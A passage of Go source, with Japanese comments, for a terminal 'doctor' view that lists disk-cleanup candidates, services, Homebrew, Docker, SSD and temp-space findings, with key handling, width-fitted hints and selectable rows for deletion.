			return DoctorSwallow
		}
		if k, ok := v.expandableRow(); ok {
			v.openRow(k)
		}
	case "y", "Y":
		if v.cur.index < 0 || v.cur.index >= len(v.rows) || !v.rows[v.cur.index].selectable {
			return DoctorNothing
		}
		row := v.rows[v.cur.index]
		v.pendingCopy = row.copyText
		action := DoctorCopyText
		if key == "y" {
			v.pendingCopy, action = row.copyPath, DoctorCopyPath
			v.copyNoun = row.copyKind.noun()
		}
		if v.pendingCopy == "" {
			return DoctorNothing
		}
		return action
	default:
		v.applyMotion(listnav.MotionOf(key), page) // 移動の語彙 (j/k/g/G/半ページ) は listnav が持つ
	}
	return DoctorSwallow
}

// applyMotion はカーソル移動を適用する。cur.move は選択できない行 (見出し) を飛ばすので、
// 半ページは 1 行ずつ積む (行数の足し算にすると見出しの上で止まる)。
func (v *DoctorView) applyMotion(m listnav.Motion, page int) {
	switch m {
	case listnav.Down:
		v.cur.move(v.rows, +1)
	case listnav.Up:
		v.cur.move(v.rows, -1)
	case listnav.HalfDown:
		for range listnav.Half(page) {
			v.cur.move(v.rows, +1)
		}
	case listnav.HalfUp:
		for range listnav.Half(page) {
			v.cur.move(v.rows, -1)
		}
	case listnav.Top:
		// fellBack は消さない: tui が handleKey より前に必ず取り出すので、ここに来た時点で
		// 常に false (書いても意味が無く、Bottom 側にも同じ行が無い = 非対称だった)
		v.cur.index, v.cur.key, v.cur.offset = 0, "", 0
		v.cur.move(v.rows, 0)
	case listnav.Bottom:
		v.cur.index = len(v.rows) - 1
		v.cur.move(v.rows, 0)
	case listnav.None:
	}
}

// hint は最下行の案内。**幅に入らない項目は落とす** (切ると語の途中で切れて意味が壊れ、
// しかも消えるのは常に末尾 = 抜ける手段が消える。status viewer と同じ term.FitHintItems の作法)。
// 実測 2026-09-03: 固定文字列だと 112 桁あり、popup の予算 82 桁で「D/q/esc: 閉じる」と
// 「(削除はまだできません)」が画面から消えていた。
func (v *DoctorView) Hint(width int) string {
	// 🚨 下見 (preparing) と実行 (running) を 1 語に畳まない。下見はまだ何も壊しておらず、
	// パネルは「削除できるか確認しています」と言う。ここだけ「実行中」と読ませると、
	// 押していいキーの判断が変わる (中断の重さが違う)
	if v.del.preparing {
		return " 確認しています (Ctrl-C ×2 で中断)"
	}
	if v.del.running {
		return " 実行中です (Ctrl-C ×2 で中断)"
	}
	if v.del.confirm {
		if !planHasWork(v.del.plan) {
			return " 消せるものがありません (何かキーを押すと戻ります)"
		}
		// 🚨 送り方 (j/k) は**パネルの注記が唯一の出典**。ここに足すと、hint は
		// 前フレームの高さから scrollable を判断するので 1 フレーム遅れ、
		// 「パネルと hint が違うことを言う」形になる
		return " y: 削除する   n/Esc: やめる   (Enter は何もしない)"
	}
	if v.del.result != nil || v.del.err != "" {
		return " y: 出力をコピー   他のキー: 閉じてもう一度スキャン"
	}
	// 🚨 **タブごとに出す導線を変える**。一覧に d (削除) と x (実行) が同時に出ていたのが
	// 混乱の元だったので、タブが違えば案内自体を出さない (押せないキーを案内しない)
	items := []term.HintItem{
		{Text: "j/k: 移動", Prio: 3},
	}
	switch v.tab {
	case TabDisk:
		items = append(items,
			term.HintItem{Text: "Space: 選択", Prio: 2}, // 削除の入口なので Enter より優先して残す
			term.HintItem{Text: "d: 削除", Prio: 2})
	case TabBrew, TabDocker:
		items = append(items, term.HintItem{Text: "Space: 選択", Prio: 2})
	case TabSvc, TabSSD, TabTmp:
		// サービス・SSD・一時領域は選択も実行も持たない (見て判断するだけ。一時領域の片付けは Y のプロンプトから Claude に頼む)
	}
	// 🚨 押せないキーを案内しない: Enter と y はカーソル行の実際の判定 (expandableRow / copyableRow) から出す
	// 子行の Enter は親を畳む (HandleKey が collapseAtCursor を先に見る) ので、畳めるときも案内する
	if _, ok := v.expandableRow(); ok || v.collapsibleAtCursor() {
		items = append(items, term.HintItem{Text: "Enter: 開閉", Prio: 4}) // 開くと対象パスへカーソルが移り、そこでも Space で選べる
	}
	if row, ok := v.copyableRow(); ok {
		items = append(items, term.HintItem{Text: row.copyKind.hint(), Prio: 5})
	}
	items = append(items, []term.HintItem{
		{Text: v.copyTextHint(), Prio: 6},
		{Text: "r: 再スキャン", Prio: 5},
		{Text: doctorCloseHintLabel(v.collapsibleAtCursor()), Prio: 1}, // 抜ける手段は最優先で残す
	}...)
	// 🚨 x は**選ばれているときだけ出す**。常設すると幅の予算を食い、`r: 再スキャン` のような
	// 常に使える手を押し出す (実測: 幅 120 で再スキャンが消えた)。手が選ばれていないときの
	// x は「Space で選んでください」と言うだけなので、案内する価値も無い
	if n := v.selectedRunCount(); n > 0 && (v.tab == TabBrew || v.tab == TabDocker) {
		items = append(items, term.HintItem{Text: fmt.Sprintf("x: %d 件を実行", n), Prio: 2})
	}
	if n, total := v.selectionSummary(); n > 0 && v.tab == TabDisk {
		items = append([]term.HintItem{{Text: fmt.Sprintf("選択 %d 件 %s", n, disk.HumanSize(total)), Prio: 1}}, items...)
	}
	return term.FitHintItems(width, items)
}

// selectedRunCount は今のタブで x が実行する件数。
// 🚨 **len(v.selectedActions) では数えない。** brew と docker は選択の map を共有しており
// (同一性はコマンド文字列)、素の長さだと別のタブの選択まで数えて hint が嘘になる。
func (v *DoctorView) selectedRunCount() int {
	switch v.tab {
	case TabDocker:
		return len(v.selectedDockerActions())
	case TabBrew:
		return len(v.selectedBrewActions())
	case TabDisk, TabSvc, TabSSD, TabTmp:
		return 0
	}
	return 0
}

// copyableRow はカーソル行が y でコピーできる行か (HandleKey の y と同じ条件)。
// 案内の語はその行の copyKind から取る (押せる手の説明が嘘になると、押さなくなる)。
func (v *DoctorView) copyableRow() (doctorRow, bool) {
	if v.cur.index < 0 || v.cur.index >= len(v.rows) {
		return doctorRow{}, false
	}
	row := v.rows[v.cur.index]
	return row, row.selectable && row.copyPath != ""
}

// doctorCloseHintLabel は閉じるキーの案内。**畳めるものがある間は q を載せない**:
// その打鍵は画面を閉じず 1 段畳むので、案内に混ぜると「q で閉じる」が嘘になる。
// D と esc はどちらの状態でも無条件に閉じるため、抜ける手段は常に案内に残る。
func doctorCloseHintLabel(collapsible bool) string {
	if collapsible {
		return "D/esc: 閉じる"
	}
	return "D/q/esc: 閉じる"
}

// DoctorRenderOpts は描画情報。
type DoctorRenderOpts struct {
	// env は再起動の注記の判定に要る (実効 TMPDIR が dirhelper の担当かどうか)。
	// 🚨 既定のゼロ値は「注記を出さない」側 = 安全側に倒れる
	Env     disk.Env
	Width   int
	Page    int
	Colored bool
	Spinner string
	Now     time.Time
}

// lines はちょうど page 行を返す (全画面 viewer 共通の契約)。行を組み直し、カーソルが窓に入るよう offset を寄せる。
func (v *DoctorView) Lines(o DoctorRenderOpts) []string {
	// 削除の確認 / 進捗 / 結果は全画面で差し替える (重ねると狭い幅で下の行が透けて読めなくなる)
	if panel := v.deletePanel(o); panel != nil {
		return layout.PadTo(panel, o.Page)
	}
	v.rows = flattenDoctorRows(v.buildRows(o))
	v.jumpIntoDetail()
	v.cur.restore(v.rows)
	head := []string{v.headerLine(o), v.tabBarLine(o), ""}
	room := max(o.Page-len(head), 1)
	from := v.cur.window(len(v.rows), room)
	out := make([]string, 0, o.Page)
	out = append(out, head...)
	for i := from; i < len(v.rows) && len(out) < o.Page; i++ {
		mark := "  "
		if i == v.cur.index && v.rows[i].selectable {
			mark = "▶ "
		}
		out = append(out, term.TruncateDisp(mark+v.rows[i].text, o.Width, "…"))
	}
	return layout.PadTo(out, o.Page)
}

// flattenDoctorRows は row の text から改行を落として「1 row = 1 行」を機械で守る。
//
// 🚨 doctorRow は名前のとおり 1 行のつもりだが、それを守っていたのは組み立て側の規律だけだった。
// 改行が 1 つ混ざると**固定高パネルの行数が増える**のに、行数を数えるテスト
// (TestDoctorLinesFillsPage) はスライスの要素数しか見ないので素通りする
// (実測 2026-09-04: brew の Unavailable で要素 20 個・実際の出力 21 行)。
// 出口 1 箇所で潰しておけば、無害化の使い分け (PlainLine / PlainBlock) を間違えた将来の
// 1 行も構造的に止まる。**copyText / copyPath は対象外** (コピー文は複数行が正常)。
func flattenDoctorRows(rows []doctorRow) []doctorRow {
	for i, r := range rows {
		if strings.ContainsRune(r.text, '\n') {
			rows[i].text = strings.ReplaceAll(r.text, "\n", " ")
		}
		if len(r.detail) > 0 {
			rows[i].detail = flattenDoctorRows(r.detail)
		}
	}
	return rows
}

func (v *DoctorView) headerLine(o DoctorRenderOpts) string {
	left := " doctor"
	switch {
	case v.Scanning():
		left += "  " + o.Spinner + " スキャン中 " + app.TimeNow().Sub(v.startedAt).Round(time.Second).String()
	case !v.snapshotAt.IsZero():
		left += fmt.Sprintf("  %d 分前の結果 (r で再スキャン)", int(o.Now.Sub(v.snapshotAt).Minutes()))
	}
	// 🚨 キーの凡例をここに置かない。**hint() が唯一の出典**にする (下段は常に描かれる)。
	// 右端にも凡例を置くと、語も内容も hint と食い違う
	// (「詳細」vs「開閉」/ q が無い / Space と d が無い) うえ、hint が
	// term.FitHintItems を使うのに、こちらは幅が足りないと凡例ごと消す方式になる。
	// 状態 (スキャン中 / 前回の結果) はここにしか無いので、そちらだけ残す
	return left
}

// moveTab はタブを送る。カーソルはタブごとに覚える (戻ったときに元の行に居る)。
//
// h/l / left/right / tab も同じ入口 (issues viewer と同じ語彙)。
func (v *DoctorView) moveTab(d int) {
	v.tabCur[v.tab] = v.cur
	// 🚨 出していないタブは飛ばす (Docker が無い環境で「空のタブ」を通らせない)。
	// 全部不可視になることは無い (Docker 以外は常に可視) が、念のため回数で打ち切る
	n := int(v.tab)
	for range numDoctorTabs {
		n = (n + d + numDoctorTabs) % numDoctorTabs
		if v.tabVisible(DoctorTab(n)) {
			break
		}
	}
	v.tab = DoctorTab(n)
	v.cur = v.tabCur[v.tab]
}

// tabBarLine は 3 つのタブと件数を 1 行で出す。
//
// 🚨 **切り替えなくても「どこに何件あるか」が分かること**が、タブにしても一望性を失わない条件。
// 件数を出さないタブ行にすると、異常の有無を知るために全タブを回ることになる。
func (v *DoctorView) tabBarLine(o DoctorRenderOpts) string {
	names := [numDoctorTabs]string{"ディスク", "サービス", "Homebrew", "Docker", "SSD", "一時領域"}
	short := [numDoctorTabs]string{"Disk", "Svc", "Brew", "Docker", "SSD", "Tmp"}
	build := func(names [numDoctorTabs]string, pad string) string {
		parts := make([]string, 0, numDoctorTabs)
		for i := range numDoctorTabs {
			t := DoctorTab(i)
			if !v.tabVisible(t) {
				continue
			}
			label := names[i] + " " + v.tabSummary(o, t)
			if t == v.tab {
				parts = append(parts, doctorColor(o.Colored, term.AnsiBold, "["+label+"]"))
				continue
			}
			parts = append(parts, doctorColor(o.Colored, term.AnsiDim, pad+label+pad))
		}
		return " " + strings.Join(parts, doctorColor(o.Colored, term.AnsiDim, "│"))
	}
	// 狭い幅では段階的に詰める: ①選んでいないタブの前後の空白を外す ②タブ名を短くする。
	// 🚨 末尾を切るのは最後の手段: 切られるのは最後のタブ (SSD) の要約で、タブ行の役目
	// (切り替えずにどこに異常があるか分かる) を失う (実測: 幅 60・実在の値で 63 桁)
	line := build(names, " ")
	if term.DispWidth(line) > o.Width {
		line = build(names, "")
	}
	if term.DispWidth(line) > o.Width {
		line = build(short, "")
	}
	if term.DispWidth(line) > o.Width {
		return term.TruncateDisp(line, o.Width, "…")
	}
	// 🚨 切り替えのキーは**タブ行の隣**に置く。hint に足すと幅の予算を食って
	// 「r: 再スキャン」のような常に使える手を押し出す (実測でそうなった)
	if hintText := "  (tab / h l で切替)"; term.DispWidth(line)+term.DispWidth(hintText) <= o.Width {
		line += doctorColor(o.Colored, term.AnsiDim, hintText)
	}
	return line
}

// tabSummary はタブ 1 つぶんの件数 (走査中は spinner、診断できずは 🚨)。
func (v *DoctorView) tabSummary(o DoctorRenderOpts, t DoctorTab) string {
	switch t {
	case TabSvc:
		if v.svcRep == nil {
			return o.Spinner
		}
		return strconv.Itoa(len(v.svcRep.Findings))
	case TabBrew:
		switch {
		case v.brew == nil:
			return o.Spinner
		case v.brew.Unavailable != "":
			return "🚨"
		}
		return strconv.Itoa(len(v.brew.Warnings))
	case TabDocker:
		switch {
		case v.docker == nil:
			return o.Spinner
		case v.docker.Unavailable != "":
			return "🚨"
		}
		// 🚨 出すのは docker 自身の申告。候補の見積もりは共有レイヤーを重複計上して
		// 上振れするので、一望の数字には使わない (doctor/docker の Estimate の 🚨)
		return docker.HumanSize(v.docker.DockerReclaimable())
	case TabSSD:
		if v.ssd == nil {
			return o.Spinner
		}
		return ssdTabSummary(v.ssd.SMART)
	case TabTmp:
		return v.tmpTabSummary(o)
	case TabDisk:
		if v.diskRep == nil {
			return o.Spinner
		}
		return disk.HumanSize(disk.SumDeletable(v.diskRep.Results))
	}
	return "" // DoctorTab の外の値 (switch は exhaustive なので、タブを足すと lint がここへ来る前に止める)
}

// sectionHeaderGap は見出しの題と要約の間の空白。1 未満なら要約は入らない (sectionHeader が落とす)。
// 🚨 「要約が入るか」を呼び出し側で書き直さず、これを呼ぶ (SSD の見出しが題を削るかの判定で
// 1 桁食い違い、幅 58 で要約だけが消えた)
func sectionHeaderGap(o DoctorRenderOpts, title, summary string) int {
	return o.Width - 2 - term.DispWidth("▌"+title) - term.DispWidth(summary) - 1
}

// sectionHeader は案 A の見出し 2 行 (左に縦棒 + 太字の題、右端に要約 / 下に罫線)。
func sectionHeader(o DoctorRenderOpts, title, summary string) []doctorRow {
	left := "▌" + title
	inner := o.Width - 2 // 行頭のカーソル欄 2 桁
	line := doctorColor(o.Colored, term.AnsiBold, left)
	if gap := sectionHeaderGap(o, title, summary); gap >= 1 {
		line += term.PadSpaces(gap) + summary
	}
	rule := strings.Repeat("─", max(1, inner))
	return []doctorRow{{text: line}, {text: doctorColor(o.Colored, term.AnsiDim, rule)}}
}

// buildRows はセクション列 (ディスク / サービス / Homebrew)。展開中の行はその直後に detail を足す。
func (v *DoctorView) buildRows(o DoctorRenderOpts) []doctorRow {
	var rows []doctorRow
	add := func(section []doctorRow) {
		for _, r := range section {
			rows = append(rows, r)
			if r.selectable && v.expanded[r.key] {
				rows = append(rows, r.detail...) // 詳細の行も選べることがある (ディスクの対象パス)
			}
		}
		rows = append(rows, doctorRow{})
	}
	switch v.tab {
	case TabSvc:
		add(v.svcSection(o))
	case TabBrew:
		add(v.brewSection(o))
	case TabDocker:
		add(v.dockerSection(o))
	case TabSSD:
		add(v.ssdSection(o))
	case TabTmp:
		add(v.tmpSection(o))
	case TabDisk:
		add(v.diskSection(o))
	}
	return rows
}

// textRows は「ただ表示するだけ」の詳細行 (選べない)。
func textRows(lines []string) []doctorRow {
	out := make([]doctorRow, 0, len(lines))
	for _, l := range lines {
		out = append(out, doctorRow{text: l})
	}
	return out
}

func doctorColor(colored bool, code, s string) string {
	if !colored {
		return s
	}
	return code + s + term.AnsiReset
}

func (v *DoctorView) diskSection(o DoctorRenderOpts) []doctorRow {
	results := v.diskResults
	partial := false
	if v.diskRep != nil {
		results = v.diskRep.Results
		partial = v.diskRep.Partial
	}
	// 🚨 **同一フレームで tabSummary も SumDeletable を呼ぶ (2 回) が、まとめない**。
	// SumDeletable は Result を舐めて int64 を足すだけで**確保を 1 バイトもしない**ので、
	// フレーム確保への寄与は 0。まとめるなら `diskRep.Total` を使う形になるが、それは
	// **Total の鮮度** (削除の後に Report を作り直したか) に依存する — 「消したのに減らない」は
	// 実際に起きた形 (doctor_cache.go の注記)。得るものが無いのに壊れる余地だけ増える。
	total := disk.SumDeletable(results)
	summary := fmt.Sprintf("合計 %s 解放可能", disk.HumanSize(total))
	switch {
	case v.diskRep == nil:
		summary = fmt.Sprintf("%s スキャン中 %d/%d   %s", o.Spinner, len(results), v.diskTotal, summary)
	case partial:
		summary = "(中断: 部分結果) " + summary
	}
	rows := sectionHeader(o, "ディスク占有", summary)
	// 🚨 **毎フレームのコピー + 整列はメモ化しない**。確保は slice 1 本ぶんで、
	// 他のメモ化が削った -19,950 B/frame に対して無視できる。メモ化すると
	// 「results が変わったか」の判定を持つことになり、走査中 (1 件ずつ届く) と削除後に
	// 無効化し忘れる経路が増える。
	sorted := append([]disk.Result(nil), results...)
	sort.SliceStable(sorted, func(a, b int) bool { return sorted[a].Size > sorted[b].Size })
	shown := 0
	for _, r := range sorted {
		// 候補 0 件の行は畳む。🚨 ただし **検出条件そのものが未実測のエントリは畳まない**。
		// 畳むと「名前が違って 1 件も当たらなかった」が「候補なし = きれい」と
		// **同じ見え方**になり、探せていないことが画面から永久に消える (false green)。
		// CLI 側 (src/doctor/disk/report.go) と同じ規律。実測で名前が確定して
		// Entry.Unverified が空になれば、この行も自動的に畳まれる側へ戻る。
		if disk.Foldable(r) {
			continue
		}
		shown++
		size := disk.HumanSize(r.Size)
		if r.Status == disk.StatusFailed {
			size = "---"
		}
		mark, color := doctorRiskMark(r)
		// ラベル列は狭い幅で縮める。**マークより先にラベルを削る**のは、切れて困る順が
		// 「状態 > ラベルの詳細」だから (幅 60 で `⛔ 要…` になると、その行が何なのかは
		// 分かってもどう扱えばよいかが消える。実測 2026-09-03)
		labelW := doctorLabelWidth
		// 🚨 **カーソル欄 (2 桁) を引く**。lines が行頭に "  " / "▶ " を足してから
		// 幅で切るので、ここで引かないと最長マーク「❓ 走査できず」(幅 13) が切れる。
		// 同じファイルの sectionHeader は `o.width - 2` と正しく引いており、非対称だった
		// (フレーム最小構成の contentWidth 53 では常時 +2 超過。実測 2026-09-04)
		if room := o.Width - doctorDiskRowFixedW - doctorMaxMarkWidth() - term.CursorGutterWidth; room < labelW {
			labelW = max(room, doctorMinLabelWidth)
		}
		label := term.TruncateDisp(r.Entry.Label, labelW, "…")
		// 選択の印は**半角 1 桁で固定**する (全角を混ぜると列がずれる)。
		// `*` = エントリ全体 / `+` = 中の一部だけ (Enter で開いて個別に選んだ状態)
		sel := " "
		switch {
		case v.selected[resultEntryID(r)]:
			sel = doctorColor(o.Colored, term.AnsiBold, "*")
		case v.hasSelectedItems(resultEntryID(r)):
			sel = doctorColor(o.Colored, term.AnsiBold, "+")
		}
		row := doctorRow{
			text:       fmt.Sprintf("%s%8s  %s%s %s", sel, size, label, term.PadSpaces(labelW-term.DispWidth(label)), doctorColor(o.Colored, color, mark)),
			selectable: true,
			key:        diskRowKey(resultEntryID(r)),
			hasDetail:  diskHasDetail(r),
			detail:     v.diskDetailIfExpanded(o, r),
			copyPath:   diskCopyPath(r),
			copyText:   diskCopyText(r, mark),
		}
		rows = append(rows, row)
		// 🚨 注記は**行の直後**に出し、助言 (advice) には連結しない。
		//   - 連結しない: 行は幅で切られるので (実測: 幅 40 で注記自体も切れる)、助言に足すと
		//     注記が丸ごと末尾から消える。独立行なら少なくとも「再起動すると消える…」まで読める
		//   - 助言より前: 下の分岐が blocked / failed / 未実測 0 件で `continue` するため、
		//     後ろに置くと**実機では一度も出ない** (2026-09-04 実測。CLI 側と同じ理由)
		if note := disk.RebootNote(r.Entry, o.Env); note != "" && r.Status != disk.StatusFailed {
			rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiDim, "           "+note)})
		}
		if r.Status == disk.StatusFailed || r.Status == disk.StatusBlocked {
			// 理由は 1 行下に出す (マーク列に置くと狭い幅で切れる)
			rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiDim, "           "+r.Reason)})
			continue
		}
		// 未実測のエントリで 0 件のときは、Recover (「消しても再生成されます」) を出さない。
		// 消す対象が 1 件も無いのに復元方法を出すと、**検出できている**ように読めるため。
		if r.Entry.Unverified != "" && len(r.Items) == 0 {
			rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiDim,
				"           0 件ですが「候補なし」ではありません: "+r.Entry.Unverified)})
			continue
		}
		advice := r.Entry.Recover
		if newest := doctorNewest(r); !newest.IsZero() {
			advice += fmt.Sprintf("。最終更新 %s (%d日前)", newest.Format("2006-01-02"), int(o.Now.Sub(newest).Hours()/24))
		}
		if r.Reused {
			// 🚨 再利用の注記は**行頭**に置く。末尾に足すと狭い幅で真っ先に切れ、
			// 「その数字は今測ったものではない」が分からなくなる (「注記で分かる形にしてある」
			// という前提が幅で崩れる)
			advice = fmt.Sprintf("%d 分前の計測を再利用 (r で再計測)。%s", int(o.Now.Sub(r.MeasuredAt).Minutes()), advice)
		}
		rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiDim, "           "+advice)})
		for _, f := range r.Failures {
			// 「診断できず」は最も追加調査が必要な行なので、選んで中身を取り出せるようにする
			// (幅で末尾が切れても y / Y で完全な文字列が手に入る。幅そのものの改善は issues/182)。
			// 🚨 y が渡すのは理由の文字列 (パスを含む) で、パス単体ではない: disk.Result.Failures が
			// []string で、パスがエラー文に埋め込まれているため (構造化は issues/180 で保留と判断)
			rows = append(rows, doctorRow{
				text:       doctorColor(o.Colored, term.AnsiYellow, "           ❓ 一部走査できず (合計に含めていません): "+f),
				selectable: true,
				key:        diskFailRowKey(resultEntryID(r), f),
				hasDetail:  true,
				detail: textRows([]string{
					doctorColor(o.Colored, term.AnsiDim, "        "+r.Entry.Label+" の一部を走査できませんでした (この分は合計に入っていません)"),
					doctorColor(o.Colored, term.AnsiDim, "        "+f),
				}),
				copyPath: f, // パスではなく走査できなかった理由の文 (パスを含む)
				copyKind: copyKindError,
				copyText: diskCopyText(r, mark),
			})
		}
	}
	if v.diskRep != nil && shown == 0 {
		rows = append(rows, doctorRow{text: doctorColor(o.Colored, term.AnsiDim, "   掃除候補はありません")})
	}
	return rows
}

// diskDetail は Enter で開く内訳。**対象パスの行は選べる** (ディレクトリ単位で削除するため。
// ユーザー要望 2026-09-03)。Inspect の中身一覧は「人が見て判断する」ためのものなので選べない。
// diskHasDetail は「この行を展開したら 1 行でも出るか」。
//
// 🚨 **diskDetail の空判定と同じものを 2 箇所に書かないための唯一の出典。** 270 で detail を
// 遅延化したとき、行は `hasDetail: true` を無条件に立てていたので、items の無い blocked /
// failed の行が「展開できる」ことになった。Enter しても行は増えないのに expanded だけ立ち、
// **次の q が畳む側に取られて doctor が 1 回目で閉じない** (実測 2026-09-06)。
// 遅延化を捨てずに直すには、展開せずに答えられる述語が要る。
// 一致は TestDiskHasDetailMatchesBuilder が突き合わせる (片方だけ育てたら red)。
func diskHasDetail(r disk.Result) bool {
	return r.Status == disk.StatusOK || r.Entry.Detail != "" || r.Entry.Inspect ||
		len(r.Contents) > 0 || len(r.Items) > 0
}

func (v *DoctorView) diskDetail(o DoctorRenderOpts, r disk.Result) []doctorRow {
	if !diskHasDetail(r) {
		return nil
	}
	out := make([]doctorRow, 0, 2+len(r.Contents)+len(r.Items))
	// 走査できなかった行に削除経路を出さない。消せる候補が確定していないのに
	// 「削除経路: rm」だけ出ると、消してよいものが見つかったように読める
	// (CLI の Format は failed のとき理由だけを出す。UI もそれに揃える)
	// 🚨 **ok の行にだけ**削除の案内を出す。blocked (今は対象外) にも出していたので、
	// 「Space で選び d で削除」と案内しておいて Space が拒否する形になっていた
	// (実測 2026-09-03)
	if r.Status == disk.StatusOK {
		out = append(out, doctorRow{text: doctorColor(o.Colored, term.AnsiDim,
			"             削除経路: "+r.Entry.DeleteVia+" (Space で選び d で削除)")})
	}
	if r.Entry.Detail != "" {
		out = append(out, doctorRow{text: doctorColor(o.Colored, term.AnsiDim, "             "+r.Entry.Detail)})
	}
	if r.Entry.Inspect || len(r.Contents) > 0 {
		// 🚨 **対象パスの行を必ず出す**。Contents があると選べる行を出さずに
		// 返すと、Inspect の 5 エントリ (どれも RiskConfirm) は「エントリ全体か、何もしないか」
		// しか選べない。README と画面の「ディレクトリ単位で選べる」が嘘になり、
		// jumpIntoDetail の飛び先 (diskitem:) も無いのでカーソルも動かない
		out = append(out, v.diskItemRows(o, r)...)
		// 🚨 Inspect は「中身を見てから選ばせる」ためのゲートなので、**開いても何も出ない**形を
		// 作らない (中身が無いのか、走査が拾えなかったのかが区別できないまま選べてしまう)
		if len(r.Contents) == 0 {
			out = append(out, doctorRow{text: doctorColor(o.Colored, term.AnsiDim,
				"             (中身の一覧はありません。上の対象パスから選んでください)")})
			return out
		}
		// 中身は**選べない**: Contents は全 Item を平坦に連結した名前の羅列で、パスもサイズも
		// 持たない (選択の単位にできない)。選ぶのは上の対象パス行
		out = append(out, doctorRow{text: doctorColor(o.Colored, term.AnsiDim,
			"             中身 (この一覧は選べません):")})
		for _, c := range r.Contents {
			out = append(out, doctorRow{text: "               - " + c})
		}
		return out
	}
	return append(out, v.diskItemRows(o, r)...)
}

// diskItemRows は対象パスを 1 行ずつ、**選べる行**として出す。エントリ全体でなく
// ディレクトリ単位で消したいときの入口 (`Space` で個別に選ぶ)。
func (v *DoctorView) diskItemRows(o DoctorRenderOpts, r disk.Result) []doctorRow {
	out := make([]doctorRow, 0, len(r.Items))
	for _, it := range r.Items {
		mark := " "
		if v.selectedItems[diskItemKey(resultEntryID(r), it.Path)] {
			mark = doctorColor(o.Colored, term.AnsiBold, "*")
		}
		riskMark, _ := doctorRiskMark(r)
		out = append(out, doctorRow{
			text: fmt.Sprintf("        %s%9s  %s", mark, disk.HumanSize(it.Size),
				doctorFitPath(it.Path, o.Width-doctorItemPathFixedW)),
			selectable: true,
			key:        diskItemRowKey(diskItemKey(resultEntryID(r), it.Path)),
			copyPath:   it.Path,
			// 🚨 エントリ全体の解説を使い回さない。この行が指すのは**この 1 本**なので、
			// 合計や他のパスを混ぜると「何を聞かれているか」がずれる
			copyText: diskItemCopyText(r, it, riskMark),
		})
	}
	return out
}

// doctorFitPath はパスを予算に収める。🚨 **先頭を削って末尾を残す**。
// 末尾から切ると「どのディレクトリを消すのか」がまさに消える: DerivedData の
// `ThumbnailThumb-cxxbmelbwqqahjagpvzoszkxfvfz` はハッシュ部で世代を見分けるので、
// そこが落ちると同一プロジェクトの旧世代を区別できない。規律の正本は termwidth.TruncateLeft の
// doc と status_view.go:statusPathText。
func doctorFitPath(path string, width int) string {
	if width <= 0 {
		return ""
	}
	return term.TruncateDispLeft(path, width, "…")
}

// doctorItemPathFixedW は対象パス行のうちパス以外が使う幅 (8 空白 + 選択の印 1 +
// サイズ %9s + 空白 2) と、行頭のカーソル欄。
const doctorItemPathFixedW = 8 + 1 + 9 + 2 + term.CursorGutterWidth

func doctorRiskMark(r disk.Result) (string, string) {
	// 🚨 **語は disk.Mark が唯一の出典**。CLI (diskdoctor の Format) と同じ文字列がここへ来る。
	// 同じ写像を 2 つ持たない。「相手と同じ語彙を使うこと」というコメントだけが両者を
	// 結ぶ形では、片側だけ語を変えてもどちらのテストも赤くならない。
	// ここが持つのは**色だけ**: doctor module は表示幅・色の依存を持たない方針。
	//
	// 記号は表示幅が安定するものだけ使う。⚠️ (U+26A0 + VS16) は端末によって 1 桁と 2 桁で揺れ、
	// 行の右端がフレームごとに動いて見えた (ユーザー報告 2026-09-02)。🚨 (U+1F6A8) は常に 2 桁。
	// 色の対応は語ごとではなく**状態ごと**に決める (語が変わっても色の意味は変わらない)。
	return disk.Mark(r), doctorRiskColor(r)
}

// doctorRiskColor は行の色。語 (disk.Mark) と 1 対 1 に対応させること。
// 🚨 NO_COLOR では色が消えるので、色だけで区別している状態を作らない
// (「触れない」と「注意して消す」は記号でも分かれている)。
func doctorRiskColor(r disk.Result) string {
	switch r.Status {
	case disk.StatusBlocked:
		return term.AnsiYellow
	case disk.StatusFailed:
		return term.AnsiDim
	case disk.StatusOK:
		// 検出条件が未実測で候補 0 件 (disk.Mark は "🔎 未検証" を返す)
		if r.Entry.Unverified != "" && len(r.Items) == 0 {
			return term.AnsiDim
		}
	}
	switch r.Entry.Risk {
	case disk.RiskSafe:
		return term.AnsiGreen
	case disk.RiskCaution:
		return term.AnsiYellow
	case disk.RiskConfirm:
		return term.AnsiRed
	}
	return ""
}

// doctorLabelWidth はディスク行のラベル列の表示幅 (リスク記号の列を揃えるため)。
// 端末が狭いときは doctorMinLabelWidth まで縮める。
const doctorLabelWidth = 40

const (
	// doctorDiskRowFixedW はディスク行のラベル以外の固定部分 (" %8s  " + マーク前の空白 1)。
	doctorDiskRowFixedW = 12
	// doctorMinLabelWidth はこれ以上は縮めない下限。ここを割るほど狭い端末では
	// ラベルもマークも切れるが、**マークを優先して残す** (状態が読めない行は使えない)
	doctorMinLabelWidth = 8
)

// doctorMaxMarkWidth はリスク記号の最大表示幅。マークは固定語彙なので測れる
// (可変長の理由をマーク列へ入れない)。
//
// 🚨 **語彙から導出する形を保つこと**。以前 5 語をハードコードしていて
// `🔎 未検証` が抜けた事故があり、`disk.MarkVocabulary()` から導く形へ直した経緯がある。
// メモ化は導出性を壊さない (初回に語彙を全部舐める) が、**定数へ焼き直すのは 238 の回帰**。
//
// メモ化の理由は「**プロセス不変の値を毎フレーム再計算しないため**」。
// 語彙もその表示幅もプロセス内で変わらないのに、行ループから毎行呼ばれていた。
// 実測 (darwin/arm64・-race・doctor-disk フレーム): 600 allocs / 83,122 B →
// hoist 単独 577 / 65,641 → **memo 単独 579 / 63,174** (-19,948 B = **24%**)。
// 🚨 効くのは呼び出し回数ではなく**中身**: `MarkVocabulary()` は呼ぶたびに `[]Item` と
// `[]Result` を 6 件ぶん構築する。だから行ごとに呼ぶと効いた。同型に見える
// `dockerMarkWidth` (string 4 個) は同じ手を当てても効果 0 だった (doctor_docker.go の注記)。
// (x/ansi の init 順を避けるため、という理由づけは誤り — Go は import 先の init を
// 先に完了させるので初期化順の心配は要らない)
var doctorMaxMarkWidth = sync.OnceValue(func() int {
	w := 0
	for _, m := range disk.MarkVocabulary() {
		w = max(w, term.DispWidth(m))
	}
	return w
})

func doctorNewest(r disk.Result) time.Time {
	var t time.Time
	for _, it := range r.Items {
		if it.Mtime.After(t) {
			t = it.Mtime
		}
	}
	return t
}

func (v *DoctorView) svcSection(o DoctorRenderOpts) []doctorRow {
	if v.svcRep == nil {
